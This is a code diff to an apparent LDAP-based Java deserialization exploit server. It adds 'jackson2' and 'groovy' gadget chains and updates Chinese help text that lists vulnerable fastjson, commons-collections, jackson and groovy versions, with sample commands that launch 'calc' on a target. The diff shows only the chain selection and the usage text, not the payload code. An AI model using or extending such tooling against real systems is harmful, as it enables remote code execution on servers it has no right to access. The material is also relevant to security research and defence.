@@ -67,7 +67,7 @@ public class LDAPRefServer {
         } else if (cmd.hasOption("g")) {
             //内置链方式命令不能为空
             if(!cmd.hasOption("c")){
-                System.out.println("缺少'-cmd'参数");
+                System.out.println("缺少'-c'参数");
                 System.exit(0);
             }
 
@@ -90,8 +90,14 @@ public class LDAPRefServer {
                 case "jackson":
                     gadget = new Jackson();
                     break;
+                case "jackson2":
+                    gadget = new Jackson2();
+                    break;
                 case "CC4":
                     gadget = new CC4();
+                    break;
+                case "groovy":
+                    gadget = new Groovy();
                     break;
                 default:
                     System.out.println("暂不支持该链！");
@@ -116,11 +122,13 @@ public class LDAPRefServer {
                             "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\"\n" +
                             "JDK20+打法：java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c \"calc\" -rmi\n" +
                             "\n\n" +
-                            "【目前支持的链】\n" +
-                            "fastjson (影响版本：1.2.49-1.2.83)\n" +
-                            "CC6 (影响版本：<= commons-collections 3.2.1)\n" +
-                            "CC4 (影响版本：commons-collections4 4.0)\n" +
-                            "jackson (影响版本：jackson-databind 2.10.0及以上版本)" +
+                            "【目前支持的链,*号为支持JDK20+的链】\n" +
+                            "fastjson (依赖：1.2.49-1.2.83)\n" +
+                            "* CC6 (依赖：<= commons-collections 3.2.1)\n" +
+                            "CC4 (依赖：commons-collections4 4.0)\n" +
+                            "jackson (依赖：jackson-databind 2.10.0及以上版本)\n" +
+                            "jackson2 (稳定版，依赖：jackson-databind 2.10.0及以上版本 && <= spring aop 5.x)\n" +
+                            "groovy (依赖：groovy 2.3.9)" +
                             "\n\n\n"
                     , options);
         }
